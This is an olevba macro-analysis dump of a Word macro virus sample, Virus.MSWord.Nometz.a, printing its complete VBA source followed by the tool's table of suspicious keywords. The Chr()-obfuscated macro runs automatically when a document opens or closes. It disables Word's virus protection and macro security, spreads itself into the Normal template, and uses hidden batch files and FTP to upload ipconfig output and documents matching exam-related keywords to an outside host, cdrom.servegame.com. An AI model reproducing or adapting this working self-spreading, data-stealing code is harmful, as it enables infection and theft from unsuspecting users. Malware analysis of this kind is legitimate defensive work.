olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nometz.a-6b6fb966205a80d0b3c9d11253b52fd817b94832
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nometz.a-6b6fb966205a80d0b3c9d11253b52fd817b94832 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cdrom.bas 
in file: Virus.MSWord.Nometz.a-6b6fb966205a80d0b3c9d11253b52fd817b94832 - OLE stream: 'Macros/VBA/cdrom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoclose()
Dim x
x = 1
On Error Resume Next
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
sn = sv + Chr(99) + Chr(Int(Rnd(1) * 10 + 80)) + Chr(97 + 2 + 1) + "." + Chr(98) + Chr(97) + Chr(116)
s1 = sv + Chr(99) + Chr(Int(Rnd(1) * 10 + 80)) + Chr(97 + 2 + 1) + "." + Chr(102) + Chr(116) + Chr(112)
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(121) + Chr(115) + Chr(116) + Chr(101) + Chr(109) + Chr(92)

Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
ActiveDocument.ReadOnlyRecommended = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
CommandBars("tools").Controls("Macro").Visible = False
CommandBars("tools").Controls.Item(15).Visible = False
ShowVisualBasicEditor = False
doc = False
nor = False
nm = "cdrom"
x = 0
zpat = ActiveDocument.Path
znomet = ActiveDocument.FullName
znome = ActiveDocument.Name
  For Each VbComponent In ActiveDocument.VBProject.VBComponents

      If VbComponent.Name = nm Then doc = True
  
  Next
 
 For Each VbComponent In NormalTemplate.VBProject.VBComponents

      If VbComponent.Name = nm Then nor = True

  Next

If nor = False Then
    ActiveDocument.SaveAs FileName:=sv + c1 + "cdrom.dot", FileFormat _
        :=wdFormatTemplate, LockComments:=False, Password:="", AddToRecentFiles:= _
        False, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=nm, Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save

Open sn For Output As #1
    Print #1, Chr(105) + "pco" + Chr(110) + "fi" + Chr(103) + " > " + sv + "cdip." + Chr(116) + "xt"
    Close #1
   Shell sn, vbHide
        Open s1 For Output As #1
    Print #1, "o " + Chr(99) + "dr" + Chr(111) + Chr(109) + "." + Chr(115) + Chr(101) + "rvegame" + Chr(46) + Chr(99) + "om"
    Print #1, "us" + Chr(101) + "r an" + Chr(111) + "nym" + Chr(111) + "us"
    Print #1, "pa" + Chr(115) + Chr(115) + " " + Chr(99) + "drom"
    Print #1, "binary"
    Print #1, Chr(112) + "ut " + sv + "cdip." + Chr(116) + "xt"
    Print #1, "q" + Chr(117) + Chr(105) + "t"
    Close #1

    Open sn For Output As #1
    Print #1, "f" + Chr(116) + "p" + Chr(46) + Chr(101) + "x" + Chr(101) + " -n -s:" + s1
    Print #1, "del" + s1
    Print #1, "del" + sn
    Close #1
    Shell sn, vbHide

End If
If doc = False Then
Application.OrganizerCopy Source:=sv + c1 + "cdrom.dot", Destination:=ActiveDocument.FullName, Name:=nm, Object:=wdOrganizerObjectProjectItems
End If
sourcefile = ActiveDocument.Path
svt = c1 + ActiveDocument.Name
mySearchString = "Pr" + Chr(111) + Chr(118) + Chr(97)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
If x < 6 Then
  mySearchString = Chr(97) + "v" + Chr(97) + "li" + Chr(97) + "çã" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
  mySearchString = "c" + Chr(111) + "p" + Chr(101) + "v" + Chr(101)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
mySearchString = "c" + Chr(111) + "ncu" + Chr(114) + "s" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
    mySearchString = Chr(101) + "xc" + Chr(101) + "t" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
 If x = 6 Then
   If ActiveDocument.Saved = False And Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.Save
 ActiveWindow.Close
  vnome = sv + c1 + Left(znome, Len(znome) - 3) + "j" + Chr(112) + "g"
 If Left$(Application.Version, 1) = "8" Then
    WordBasic.CopyFileA FileName:=znomet, Directory:=vnome
  Else
      WordBasic.CopyFile FileName:=znomet, Directory:=vnome
  End If
        Open s1 For Output As #1
    Print #1, "o " + Chr(99) + "dr" + Chr(111) + Chr(109) + "." + Chr(115) + Chr(101) + "rvegame" + Chr(46) + Chr(99) + "om"
    Print #1, "us" + Chr(101) + "r an" + Chr(111) + "nym" + Chr(111) + "us"
    Print #1, "pa" + Chr(115) + Chr(115) + " " + Chr(99) + "drom"
    Print #1, "binary"
    Print #1, Chr(112) + "ut " + sv + c1 + Chr(42) + ".j" + Chr(112) + "g"
    Print #1, "q" + Chr(117) + Chr(105) + "t"
    Close #1
    
         Open sn For Output As #1
    Print #1, "f" + Chr(116) + "p" + Chr(46) + Chr(101) + "x" + Chr(101) + " -n -s:" + s1
    Print #1, Chr(103 - 3) + "el " + sv + c1 + Chr(42) + ".j" + Chr(112) + "g"
    Print #1, "del" + s1
    Print #1, "del" + sn
    Close #1
        Shell sn, vbHide

End If
End Sub
Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
End Sub
Sub ViewVBCode()
End Sub
Sub autoopen()
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "DontTrustInstalledFiles") = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

